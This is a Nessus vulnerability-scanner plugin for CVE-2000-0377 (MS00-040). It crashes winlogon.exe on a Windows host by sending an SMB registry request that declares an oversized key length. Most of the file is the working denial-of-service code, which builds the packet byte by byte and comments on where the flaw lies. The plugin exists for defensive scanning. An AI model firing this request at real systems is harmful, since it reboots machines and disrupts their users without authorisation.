#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10414);
 script_bugtraq_id(1331);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0377");
 name["english"] = "WinLogon.exe DoS";
 name["francais"] = "Déni de service WinLogon.exe";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "

It seems that is was possible to remotely crash 
winlogon.exe by sending a malformed request to
access the registry of the remote host. 

The scanned host should now have an error box
window on it's primary display.  As soon as the
error box is validated (clicked) the host 
will reboot.


Solution : apply hotfix Q264684

Risk factor : High

See also : http://www.microsoft.com/technet/security/bulletin/ms00-040.mspx";


 desc["francais"] = "
 
Il semble qu'il ait été possible de faire
planter le programme WinLogon.exe en lui
envoyant une requète mal formée pour accéder
à sa base de registres.

Dès que vous validerez la boite de dialogue,
l'hote distant redémarrera.

Solution : appliquez le hotfix Q264684

Facteur de risque : Elevé

Voir aussi : http://www.microsoft.com/technet/security/bulletin/ms00-040.mspx";


 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "crashes winlogon.exe";
 summary["francais"] = "fait planter winlogon.exe";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 
 script_dependencies("netbios_name_get.nasl",
 		     "smb_login.nasl");
 script_require_keys("SMB/transport", "SMB/name", "SMB/login", "SMB/password");
 script_require_ports(139, 445);
 exit(0);
}

include("smb_nt.inc");
port = kb_smb_transport();
if(!port)port = 139;



#---------------------------------------------------------------------#
# Get the key                                                         #
#                                                                     #
# This is the function that makes winlogon.exe crash                  #
#                                                                     #
#---------------------------------------------------------------------#
		 
function crash_winlogon(soc, uid, tid, pipe, key, reply)
{
 key_len = strlen(key) + 1;
 key_len_hi = key_len / 256;
 key_len_lo = key_len % 256;
 
 
 
 tid_low = tid % 256;
 tid_high = tid / 256;
 uid_low = uid % 256;
 uid_high = uid / 256;
 pipe_low = pipe % 256;
 pipe_high = pipe / 256;
 uc = unicode(data:key) + raw_string(0x19, 0x00, 0x02, 0x00);
 
 len = 148 + strlen(uc);
 
 len_hi = len / 256;
 len_lo = len % 256;
 
 
 z = 40 + strlen(uc);
 z_lo = z % 256;
 z_hi = z / 256;
 
 y = 81 + strlen(uc);
 y_lo = y % 256;
 y_hi = y / 256;
 
 x = 64 + strlen(uc);
 x_lo = x % 256;
 x_hi = x / 256;
 
 magic1 = raw_string(ord(reply[16]), ord(reply[17]));
 
 req = raw_string(0x00, 0x00,
 		  len_hi, len_lo, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00,
		  0x00, 0x00, 0x00, 0x18, 0x03, 0x80)
		  +
		  magic1 +
		 raw_string(
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00,tid_low, tid_high, 0x00, 0x28, uid_low, uid_high,
		  0x00, 0x00, 0x10, 0x00, 0x00, x_lo, x_hi, 0x00,
		  0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54,
		  0x00, x_lo, x_hi, 0x54, 0x00, 0x02, 0x00, 0x26,
		  0x00, pipe_low, pipe_high, y_lo, y_hi, 0x00, 0x5C, 0x00,
		  0x50, 0x00, 0x49, 0x00, 0x50, 0x00, 0x45, 0x00,
		  0x5C, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x05, 0x00,
		  0x00, 0x03, 0x10, 0x00, 0x00, 0x00, x_lo, x_hi,
		  0x00, 0x00, 0x02, 0x00, 0x00, 0x00, z_lo, z_hi,
		  0x00, 0x00, 0x00, 0x00, 0x0F, 0x00);
		  
 magic = raw_string(ord(reply[84]));
 for(i=1;i<20;i=i+1)
 {
  magic = magic + raw_string(ord(reply[84+i]));
 }
 
 #
 # THE PROBLEM IS HERE : We declare the length of our
 # key as a WAYYY too long value
 #
 x = 65535;
 #   ^^^^^^
 
 x_lo = x % 256;
 x_hi = x / 256;
 
 req = req + magic + raw_string(x_lo, x_hi, 0x0A, 0x02, 0x00, 0xEC,
 		0xFD, 0x7F, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, key_len_lo, key_len_hi, 0x00, 0x00) +
		uc;
		  

 send(socket:soc, data:req);
 r = smb_recv(socket:soc, length:4096);
 if(!r)return(TRUE);
 else return(FALSE);
}


#---------------------------------------------------------------------#
# crash()   							      #
#---------------------------------------------------------------------#


function crash(key, item)
{

name = kb_smb_name();
if(!name)return(FALSE);


if(!get_port_state(port))return(FALSE);


login = kb_smb_login();
pass =  kb_smb_password();

if(!login)login = "";
if(!pass) pass = "";

dom = kb_smb_domain();

	  
soc = open_sock_tcp(port);
if(!soc)exit(0);

#
# Request the session
# 
r = smb_session_request(soc:soc,  remote:name);
if(!r)return(FALSE);

#
# Negociate the protocol
#
prot = smb_neg_prot(soc:soc);
if(!prot)return(FALSE);

#
# Set up our session
#
r = smb_session_setup(soc:soc, login:login, password:pass, domain:dom, prot:prot);
if(!r)return(FALSE);
# and extract our uid
uid = session_extract_uid(reply:r);

#
# Connect to the remote IPC and extract the TID
# we are attributed
#      
r = smb_tconx(soc:soc, name:name, uid:uid, share:"IPC$");
# and extract our tree id
tid = tconx_extract_tid(reply:r);


#
# Create a pipe to \winreg
#
r = smbntcreatex(soc:soc, uid:uid, tid:tid, name:"\winreg");
if(!r)return(FALSE);
# and extract its ID
pipe = smbntcreatex_extract_pipe(reply:r);

#
# Setup things
#
r = pipe_accessible_registry(soc:soc, uid:uid, tid:tid, pipe:pipe);
if(!r)return(FALSE);
r = registry_open_hklm(soc:soc, uid:uid, tid:tid, pipe:pipe);
if(!r)return(FALSE);
r2 = crash_winlogon(soc:soc, uid:uid, tid:tid, pipe:pipe, key:key, reply:r);
return(r2);
}

#---------------------------------------------------------------------#
# Here is our main()                                                  #
#---------------------------------------------------------------------#

#
# This is bogus - whatever value will just do
#
key = "x";
item = "";

for(counter=0;counter<10;counter=counter+1)
{
value = crash(key:key, item:item);
if(value)
  {
  security_hole(port);
  exit(0);
  }
}
